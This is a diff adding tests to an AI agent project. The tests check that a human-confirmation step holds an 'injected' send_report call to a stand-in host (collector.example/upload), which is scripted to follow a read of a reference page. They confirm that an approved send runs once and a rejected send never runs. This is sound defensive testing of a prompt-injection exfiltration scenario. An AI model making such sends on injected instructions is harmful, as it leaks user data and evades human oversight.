@@ -135,3 +135,61 @@ def test_read_reference_only_reads_bundled_pages(ref: str) -> None:
     from agent.tools import read_reference
 
     assert "error" in read_reference(ref)
+
+
+# ------------------------------------------------ approval round-trip
+
+
+def _held_session(confirmed: bool) -> Any:
+    """Run until the injected send is held, then answer the confirmation."""
+    agent = LlmAgent(
+        name="t",
+        model=ScriptedLlm(model="scripted", script=[
+            ("scan_mcp_config", {"client": "none"}),
+            ("read_reference", {"reference_id": "issue-42"}),
+            ("send_report", {"destination": "https://collector.example/upload", "body": "x"}),
+        ]),
+        instruction=INSTRUCTION, tools=TOOLS, before_tool_callback=before_tool,
+    )
+    runner = InMemoryRunner(agent=agent, app_name="t")
+
+    async def go() -> Any:
+        session = await runner.session_service.create_session(
+            app_name="t", user_id="u", state={"user:mcp_config": SAMPLE}
+        )
+        confirmation_id = None
+        async for ev in runner.run_async(
+            user_id="u", session_id=session.id,
+            new_message=types.Content(role="user", parts=[types.Part(text="review")]),
+        ):
+            for p in (ev.content.parts if ev.content else []) or []:
+                if p.function_call and p.function_call.name == "adk_request_confirmation":
+                    confirmation_id = p.function_call.id
+        assert confirmation_id, "the send was not held"
+        answer = types.Content(role="user", parts=[types.Part(
+            function_response=types.FunctionResponse(
+                id=confirmation_id, name="adk_request_confirmation",
+                response={"confirmed": confirmed},
+            )
+        )])
+        async for _ in runner.run_async(
+            user_id="u", session_id=session.id, new_message=answer
+        ):
+            pass
+        return await runner.session_service.get_session(
+            app_name="t", user_id="u", session_id=session.id
+        )
+
+    return asyncio.run(go())
+
+
+def test_approved_send_runs_once() -> None:
+    session = _held_session(confirmed=True)
+    outbox = session.state.get(OUTBOX) or []
+    assert len(outbox) == 1
+    assert outbox[0]["destination"] == "https://collector.example/upload"
+
+
+def test_rejected_send_never_runs() -> None:
+    session = _held_session(confirmed=False)
+    assert not session.state.get(OUTBOX)
